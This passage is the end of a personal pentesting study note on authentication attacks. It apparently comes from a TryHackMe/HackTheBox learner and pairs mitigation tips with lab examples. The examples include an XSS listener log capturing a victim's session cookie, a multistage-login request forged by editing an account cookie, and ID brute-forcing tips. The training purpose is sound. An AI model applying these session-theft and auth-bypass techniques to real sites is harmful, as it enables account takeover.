> - **Secure Storage** — Hash and salt credentials using bcrypt/argon2
> - **Generic Errors** — Use identical, generic error messages for all failed login attempts
> - **Session Management** — Rotate session IDs on login (`session_regenerate_id()`), enforce timeouts
> - **Rate Limiting** — Implement multi-layer brute force protection on all auth pages
> - **Standards** — Follow NIST 800-63-b, use zxcvbn checker, require `exit;` after `header()`
> - **Signature Validation** — Always verify JWT signatures, SAML signatures, and integrity of tokens

---

## Credential Storage Examples

> [!SUCCESS] Storage Formats
> ```
> None:     Password1!
> AES256 + B64: jc2ZRviEVUuLV7Ljc2q7YQ==
> MD5:      0cef1fb10f60529028a71f58e54ed07b
> SHA256:   1D707811988069CA760826861D6D63A10E8C3B7F171C4441A6472EA58C11711B
> ```

---

## XSS Session Hijacking Example Output

> [!SUCCESS] Expected Output
> ```
> 10.10.10.10:52798 [200]: /script.js
> 10.10.10.10:52799 [200]: /index.php?c=cookie=f904f93c949d19d870911bf8b05fe7b2
> ```
> First hit is the script.js fetch. Second hit contains the victim's session cookie appended via `?c=`.

> [!SUCCESS] Logged Credentials
> ```
> Victim IP: 10.10.10.1 | Cookie: cookie=f904f93c949d19d870911bf8b05fe7b2
> ```

---

## EAR Bypass Example

> [!SUCCESS] Multistage Login Cookie Manipulation
> ```
> POST /login-steps/second HTTP/1.1
> Host: vuln-website.com
> Cookie: account=carlos
>
> verification-code=123456
> ```
> Changing the `account` cookie to a victim's username can compromise their account if the verification logic is flawed.

---

## Auth Bypass Parameter Manipulation Example

> [!SUCCESS] Parameter Removal Test
> Removing `user_id=183` from the URL or Brute-forcing user IDs with ffuf / Burp Intruder reveals admin-level endpoints.

---

**Finished — Happy Hacking!**

---

**Find me online:**

- TryHackMe: [t4t4r1s](https://tryhackme.com/p/t4t4r1s)
- HackTheBox: [t4t4r1s](https://app.hackthebox.com/users/2203575)
- LinkedIn: [Mustafa Eltayeb](https://www.linkedin.com/in/t4t4r1s)
- X: [@mustafa_altayeb](https://x.com/t4t4r1s)

---

<iframe src="https://tryhackme.com/api/v2/badges/public-profile?userPublicId=3186403" style="border:none;"></iframe>
